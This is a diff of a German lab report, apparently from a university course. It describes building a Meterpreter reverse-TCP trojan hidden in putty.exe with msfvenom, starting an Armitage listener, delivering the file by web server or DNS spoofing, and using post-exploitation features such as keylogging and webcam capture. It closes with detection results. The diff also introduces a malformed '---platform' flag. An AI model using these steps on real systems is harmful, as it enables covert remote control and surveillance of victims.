@@ -36,9 +36,11 @@ Die Opfer nutzen das weit verbreitete Betriebssystem Windows 10. Mit folgenden U
 	\item \textbf{Opfer 3}: Aktualisierte Version von Windows 10 (Stand: 04.05.2018)
 \end{itemize}
 
-\subsubsection{Ablauf}\label{sec:praktischeDurchfuehrung-ablauf}
+\subsection{Ablauf}\label{sec:praktischeDurchfuehrung-ablauf}
+
+\textbf{1. Erstellen des Trojaners: } 
 Zunächst wird auf dem Angreifer der Trojaner erstellt.
-Ziel ist es den Payload \code{windows/meterpreter/reverse\_tcp} in ein normales Programm (hier das bekannte \code{putty.exe}) einzuschleusen.
+Ziel ist es den Payload \code{windows/meterpreter/reverse\_tcp} in ein normales Programm (hier das bekannte \code{putty.exe}) einzuschleusen. 
 Dies geschieht mit dem Befehl \code{msfvenom}. Wobei folgende parameter gesetzt werden:
 \begin{itemize}
 	\item \textbf{Payload}: \code{-p windows/meterpreter/reverse\_tcp}
@@ -47,13 +49,73 @@ Dies geschieht mit dem Befehl \code{msfvenom}. Wobei folgende parameter gesetzt 
 		      \item \textbf{Angreifer-Port}: \code{lport=6666}
 		  \end{itemize}
 	\item \textbf{Architektur}: \code{-a x86}
-	\item \textbf{Plattform}: \code{--platform windows}
+	\item \textbf{Plattform}: \code{---platform windows}
 	\item \textbf{Dateiformat}: \code{-f exe}
 	\item \textbf{Vorlage}: \code{-x putty.exe}
 	\item \textbf{Vorlage innerhalb des Trojaners ausführen}: \code{-k}
 	\item \textbf{Ausgabe (Trojaner)}: \code{-o puttyX.exe}
 \end{itemize}
 
+\textbf{2. Aktivieren des Listeners auf dem Angreifersystem: } \hfill \\
+Für den Metasploit-Baukasten gibt es das Hilfsprogramm Armitage, dass die Möglichkeit bietet alle Einstellungen über eine grafische Oberfläche vorzunehmen.
+In Armitage wird der Listener über \code{exploit/multi/handler} gestartet. Hierfür muss dieser mit \code{Payload, Ip, Port} aus Schritt 1 konfiguriert werden.
 
+
+\textbf{3. Verbreiten und Ausführen des Trojaners: } \hfill \\
 Der erstellte Trojaner wird in das Wurzelverzeichnis des Webservers \code{/var/www/html} kopiert um diesen einfach, und gleichzeitig verhältnismäßig realitätsnah an die Opfer zu übermitteln.
+In der Praxis könnte zum verbreiten des Trojaners zum Beispiel DNS-Spoofing verwendet werden, um dem Opfer den Trojaner statt dem eigentlichen Programm zu übergeben.
+Führt das Opfer das Programm mit dem Trojaner aus, so baut dieser eine Verbindung zum Angreifer auf. 
 
+
+\textbf{4. Attackieren des Opfer-Systems: } \hfill \\
+Der Angreifer kann nun mithilfe von Armitage Zugriff auf diverse Systemfunktionalität wie Beispielsweise:
+\begin{itemize}
+	\item Interaktion (interaction)
+		\begin{itemize}
+			\item Shell/Kommandozeile öffnen und verwenden
+			\item VNC-Verbindung aufbauen
+		\end{itemize}
+	\item Zugriff (access)
+		\begin{itemize}
+			\item Privilegien ausweiten
+			\item Trojaner persistieren
+		\end{itemize}
+	\item Entdecken (explore)
+		\begin{itemize}
+			\item Dateienverzeichnis anzeigen
+			\item Prozesse anzeigen
+			\item Keylogger aktivieren
+			\item Screenshots
+			\item Webcamaufnahmen 
+		\end{itemize}
+\end{itemize}
+
+\subsection{Funktionsweise des Trojaners}\label{sec:praktischeDurchfuehrung-funktionsweise}
+\textbf{Was macht der Trojaner? }
+Der Trojaner stellt die Verbindung vom Opfer-System zum Angreifer her.
+
+\textbf{Welche Schwachstelle wird ausgenutzt? }
+\begin{itemize}
+	\item Fehlende Updates
+	\item Nutzer-Schwachstelle beim Download
+		\begin{itemize}
+			\item kein https
+			\item keine Überprüfung der Programmsignatur
+		\end{itemize}
+\end{itemize}
+
+\subsection{Ergebnisse}\label{sec:praktischeDurchfuehrung-ergebnisse}
+
+\textbf{Bewertung des Baukastens} 
+	\begin{itemize}
+		\item leichte Bedienung
+		\item kein Fachwissen notwendig
+		\item zahlreiche Möglichkeiten durch modulares System
+	\end{itemize}
+
+\textbf{Bewertung des Trojaners}
+Die Trojaner ist sehr einfach zu Erzeugen und Anzuwenden. 
+Dieser Trojaner ist jedoch durch einfache Schutzmechanismen bereits zu erkennen.
+Im Versuch zeigte sich, dass sowohl die aktualisierte Windows-Version sowie der Avira-Schutz den Trojaner rechtzeitig erkennen konnten.
+Lediglich die veraltete Windows-Version konnte den Trojaner nicht erkennen. 
+Der Trojaner selbst richtet keinen Schaden an, eröffnet jedoch Möglichkeiten für weitere Angriffe.
